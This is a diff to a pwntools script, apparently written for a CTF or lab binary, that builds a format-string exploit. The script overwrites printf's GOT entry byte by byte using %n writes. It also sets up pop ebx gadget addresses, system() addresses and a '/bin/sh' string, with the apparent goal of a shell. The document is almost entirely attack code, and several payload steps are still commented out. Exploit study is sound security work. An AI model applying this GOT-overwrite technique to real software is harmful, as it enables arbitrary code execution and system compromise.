@@ -2,7 +2,7 @@ from pwn import *
 #context.terminal = ['tmux', 'splitw', '-h']
 
 
-# printf@plt.got = 0x804a00c
+# printf@plt.got = 0x804a00c, Landing
 printf_pltgot_1 = 0x804a00c
 printf_pltgot_2 = 0x804a00d
 printf_pltgot_3 = 0x804a00e
@@ -13,6 +13,10 @@ system2 = 0xf7e04831
 system3 = 0xf7e04832
 system4 = 0xf7e04833
 
+pop_ebx1 = 0x08048439
+pop_ebx2 = 0x0804843a
+pop_ebx3 = 0x0804843b
+pop_ebx4 = 0x0804843c
 
 payload = ""
 
@@ -30,23 +34,49 @@ payload += p32(system4) # 26
 
 
 # 0x08048439 : pop ebx ; ret
-# when printf_pltgot_ runs over printf@plt.got it will hit this code.
+# Run over printf@plt.got it will hit this code.
 # bytes 11 -14
-payload += "%x"
+payload += "%25x"
 payload += "%11$n"
 
-#payload += "%75x"
-#payload += "%12$n"
+payload += "%75x"
+payload += "%12$n"
 
-#payload += "%128x"
-#payload += "%13$n"
+payload += "%1920x"
+payload += "%13$n"
 
-#payload += "%260x"
+#payload += "%x"
 #payload += "%14$n"
 
 
 # '/bin/sh\x00' = 0x6e69622f0068732f
 # bytes 15 - 22 bytes
+
+#payload += "%3x"
+#payload += "%14$n"
+
+
+#payload += "%x"
+#payload += "%16$n"
+
+#payload += "%x"
+#payload += "%17$n"
+
+#payload += "%x"
+#payload += "%18$n"
+
+#payload += "%x"
+#payload += "%19$n"
+
+#payload += "%x"
+#payload += "%20$n"
+
+#payload += "%x"
+#payload += "%21$n"
+
+#payload += "%x"
+#payload += "%22$n"
+
 
 
 # system() = 0xf7e04830
